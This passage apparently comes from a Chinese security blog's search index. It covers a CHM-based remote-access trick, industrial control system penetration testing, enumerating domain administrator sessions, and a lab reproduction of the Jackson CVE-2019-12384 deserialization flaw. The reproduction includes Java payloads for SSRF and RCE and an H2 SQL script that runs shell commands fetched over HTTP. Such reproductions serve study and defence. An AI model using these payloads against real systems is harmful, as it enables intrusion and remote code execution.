","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:4","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"通过 EasyCHM 制作 CHM 文件 通过EasyCHM编译exp.html文件 ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:5","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"双击上线 此时只要双击test.CHM文件，即可上线 ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:6","tags":["Tips","渗透测试"],"title":"MyJSRat结合CHM命令执行","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"工控安全渗透相关","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工控安全渗透 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:0:0","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统的结构和场景 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:0","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统场景——啤酒厂 啤酒工厂布局 监控总控室 生产线设备 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:1","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统结构 传感器和执行器 可编程控制器(PLC) 工业网络及现场总线 工业计算机及工业组态软件 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:2","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统应用场景 过程自动化控制系统 应用在流程行业，比如：石油，化工，医药。冶金，水处理 对应的控制系统：DCS(集散控制系统)居多，大型 PLC 为主，单台控制器 IO 点数(传感器与执行器的数量)多数在2000 点以上，全冗余架构 工厂自动化控制系统 应用在离散行业，比如：汽车，港口，烟草 对应控制系统：主要以 PLC 为主，采用和设备捆绑为主，单台控制IO点数少于2000点，单机为主 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:3","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统厂商和产品介绍 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:0","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Siemens——控制系统家族 s7-1500 控制系统 S7-1200 控制系统 S7-300/400 控制系统 S7-WINAC 控制系统(PC 模拟 PLC，多用于高校研究) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:1","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Siemens——组态家族 TIA 博图/Step7(编程) WINCC 组态监控软件(监控) PLCSIM 模拟仿真软件(前期模拟仿真) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:2","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Siemens——通讯协议及端口 S7 Comm协议(私有协议) 通讯端口(102) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:3","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Rockwell Automation——控制系统家族 Controllogix 控制系统 Compactlogix 控制系统 MicroLogix 控制系统 Softlogix 控制系统 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:4","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Rockwell Automation——组态家族 Studio5000/RSLogix 5000组态软件 FactoryTalk SE 组态监控软件 Emulation 模拟仿真软件 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:5","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Rockwell Automation——通讯协议及端口 Ethernet/IP(公开协议) 通讯端口 44818/2222 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:6","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统脆弱性分析 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:0","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制协议漏洞 所使用的工业控制协议缺乏身份认证 工业控制系统所使用的协议缺乏授权机制 所使用的工业控制协议缺乏加密保护 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:1","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"PLC 代码逻辑漏洞 计算逻辑漏洞 看门口超时漏洞 缓冲区溢出漏洞 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:2","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业以太网链路漏洞 MAC泛洪攻击 ARP溢出/中间人攻击 环网beacon协议攻击 VLAN跳转攻击 交换机WEB漏洞攻击 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:3","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"主机安全漏洞 防火墙关闭 没有杀软防护 缺乏USB准入 Windows本身漏洞 SMB v1.0 Port 445 RDP Port 3389 AD 域攻击 DNS 污染攻击 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:4","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"组态软件漏洞 DoS 拒绝服务攻击 缓冲区溢出漏洞 COM 服务组件未授权访问漏洞 SQL 数据库注入漏洞 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:5","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"物理安全漏洞 设备所在地无防护 机房机柜未上锁 网络端口未加固 控制器钥匙未拔出 供电电源为单路 接地系统不完善 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:6","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统渗透工具利用 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:0","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Demo 场景 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:1","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"nmap 指纹扫描 nmap -p port --script scada protocol ip address 参考：https://github.com/jianshting/NMAP-NSE-SCADA ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:2","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Yersinia 二层网络的攻击 Yersinia -G 参考：https://github.com/tomcat/yersinia ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:3","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"Snap7 协议层的攻击 s7 Client.exe ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:4","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"MSF 主机攻击和后渗透 对PC主机的渗透和控制(和传统内网渗透一样) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:5","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"ISF 工控渗透工具 开源的工控渗透框架 参考：https://github.com/dark-lbp/isf ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:6","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"工业控制系统安全防御 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:0","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"区域边界 工业防火墙、区域防火墙、网闸 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:1","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"网络安全 交换机空余端口关闭、native VLAN、禁用 CDP 或：LLDP、握手包报文加密 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:2","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"主机安全 杀软、防火墙、基线安全、U口准入、应用白名单 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:3","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"控制器安全 协议加密、注入控制、身份认证 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:4","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":"物理安全 接地安全、双路供电、电柜上锁 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:5","tags":["渗透测试","工控安全渗透"],"title":"工控安全渗透","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"域渗透之定位域管理员","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"定位域管理员 ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:0:0","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"1 定位域管位置 定位域管理员，特权账户在域内哪些服务器或主机上登录过 获得了通用本地口令(Windows NT5.*系统)，定位特权用户以获取特权用户的登录凭证，从而获取域管理员权限 在 Vista 系统之后，可以作为定向攻击的信息探测 ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:1:0","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"1.1 原理 通过 IPC 空连接、或低权限连接，调用系统 API，枚举目标系统中会话信息、登录历史记录、组信息及组成员信息 ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:2:0","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"1.2 相关 API NetsessionEnum NetShareEnum NetWkstaUserEnum Active Diretory Service INterfaces [ADSI] Win NT provider ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:3:0","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"2 相关工具 Netsess.exe Netview.exe Pslogon.exe PVEFindADUser.exe ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:0","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"2.1 netsess.exe 首先进行 IPC 连接，否则返回拒绝连接，错误代码为 5 运行 netsess.exe ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:1","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"2.2 nete.exe 下载地址 nets.exe \\\\192.168.8.205 /0 ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:2","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["内网渗透"],"content":"2.3 Powershell 组、组成员信息获取，ADSI 的 WinNT provider 支持，可以通过 Powershell 快速获取信息 Get-NetLocalGroup Get-NetLocalGroupMember -Computername [win10x64en] -GroupName [administrators] 在管理员在制定组策略时，可以将当前登录的域用户加入到本地管理员组中 主机组策略存放在$ GPOPath\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmp1.inf 文件和 $GPOPath\\MACHINE\\Preferences\\Groups\\Groups.xml文件中。 在实验环境中，我们添加了一个名叫 LocalAdmin 的组策略，将 reduser 用户添加到登录主机的本地管理员组 PowerView 提供了类似的更为强大的功能，Get-DomainGPOLocalGroup 命令，枚举分析所有的组策略，可方便得出结果。 Get-DomainGPOLocalGroup 的原理是分析 GptTmp1.inf 文件中是否存在特权组的变动。 ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:3","tags":["域安全","内网渗透"],"title":"定位域管理员","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["漏洞复现"],"content":"CVE-2019-12384：Jackson反序列化漏洞复现","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"CVE-2019-12384：Jackson反序列化漏洞复现 ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"分析 根据Jackson开发者提到的信息，触发这个Jackson漏洞需要满足如下要求，所以该漏洞评级为中危： 目标应用接收到不可信客户端发送的JSON数据 目标应用使用多态类型处理方式来处理java.lang.Object类型的属性； 目标应用至少包含能够在Java classpath中利用的一个“gadget”类。在该漏洞中就是依赖的第三方jar包有点多，除去jackson自身的jar包以外还需要logback-core和h2； ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"环境搭建 本文中用到的第三方库有： jackson-databind 2.9.8 jackson-annotations-2.9.8.jar jackson-core-2.9.8.jar logback-core-1.3.0-alpha4.jar h2 1.4.199 在http://www.mvnrepository.com上下载即可。 ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"漏洞代码 package com.baiyang; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.SerializationFeature; import org.h2.Driver; public class Main { public static void main(String[] args) { try { Class.forName(\"org.h2.Driver\").newInstance(); } catch (Exception e) { e.printStackTrace(); } System.out.println(\"Mapping\"); //该条payload用于SSRF的复现 String SSRF = \"[\\\"ch.qos.logback.core.db.DriverManagerConnectionSource\\\", {\\\"url\\\":\\\"jdbc:h2:tcp://127.0.0.1:4444/~/hacker\\\"}]\"; //该条payload用于RCE的复现 String RCE = \"[\\\"ch.qos.logback.core.db.DriverManagerConnectionSource\\\", {\\\"url\\\":\\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost/inject.sql'\\\"}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); System.out.println(\"Serializing\"); Object obj = null; try { //更换SSRF或RCE即可测试SSRF或者RCE漏洞的payload obj = mapper.readValue(RCE, java.lang.Object.class); } catch(Exception e) { e.printStackTrace(); } System.out.println(\"objectified\"); try { System.out.println(\"stringified: \" + mapper.writeValueAsString(obj)); } catch(Exception e) { e.printStackTrace(); } } } ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"构建步骤 本文在IDEA上生成项目 新建java Commandline项目 将上述代码替换类 单击红框中的图标，进入项目结构设置 按照下图的步骤将下载好的外部jar包导入项目文件 ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"攻击流程 将下面的sql脚本文件保存为inject.sql CREATEALIASSHELLEXECAS$$Stringshellexec(Stringcmd)throwsjava.io.IOException{String[]command={\"bash\",\"-c\",cmd};java.util.Scanners=newjava.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\");returns.hasNext()?s.next():\"\";}$$;CALLSHELLEXEC('open /Applications/Calculator.app') 注：本文在MacOS下执行的RCE，如在其它环境，请自行更换CALL SHELLEXEC中的命令。 执行本地执行python2 -m SimpleHTTPServer 80，在本地启动HTTP服务 